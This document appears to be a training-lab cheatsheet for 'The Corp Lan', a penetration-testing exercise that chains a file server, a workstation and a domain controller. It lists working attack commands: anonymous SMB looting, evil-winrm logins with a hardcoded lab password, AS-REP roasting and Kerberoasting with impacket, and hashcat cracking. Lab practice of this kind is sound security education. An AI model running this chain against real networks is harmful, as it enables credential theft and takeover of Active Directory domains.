# Cheatsheet — The Corp Lan

## Targets

- **files01** → **ws01** → **dc01** — the classic corp chain + a roastable twist

## Useful commands

```bash
smbclient -N -L //<files01>
smbclient -N //<files01>/share -c 'recurse; mget *'
netexec smb <ws01> -u wuser -p 'Work2024!' --shares
evil-winrm -i <ws01> -u wuser -p 'Work2024!'

# domain roasting (from kali or the ws)
impacket-GetNPUsers -no-pass -dc-ip <dc01> -usersfile users.txt corp.pentrain.local/
impacket-GetUserSPNs 'corp.pentrain.local/wuser:Work2024!' -dc-ip <dc01> -request
hashcat -m 18200 asrep.txt <wordlist>
hashcat -m 13100 tgs.txt <wordlist>
evil-winrm -i <dc01> -u svc-backup -p '<cracked>'
```

## Concepts

- Every note on a share is intel — the maintenance notes name the roastable
- AS-REP roast needs NO credentials — the DC answers preauth-less requests
- The workstation is a beachhead, not the objective — the DC is
